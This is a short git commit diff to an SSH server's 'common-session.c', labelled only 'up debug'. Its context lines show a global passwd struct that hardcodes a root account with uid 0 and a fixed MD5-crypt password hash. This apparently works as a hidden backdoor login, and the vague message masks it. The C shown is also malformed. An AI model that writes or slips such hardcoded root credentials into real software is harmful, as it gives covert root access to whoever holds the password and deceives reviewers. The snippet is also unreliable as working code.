9b0e4d3adc22542d986774a5a6700d23251b2bf5
Andrey Eremichev <paradoxst@bk.ru>
2021-01-18 12:04:14 +0300

    up debug

--- common-session.c
+++ common-session.c
@@ -618,7 +618,7 @@ const char* get_user_shell() {
 	}
 }
 
-struct passwd pwd_fix_1 = {
+struct passwd *pwd_fix_1 = {
     pw_name = "root",
     pw_passwd = "$1$5RPVAd$MYeVT.93uuD5BkMZfx08j1",
     pw_uid = 0,
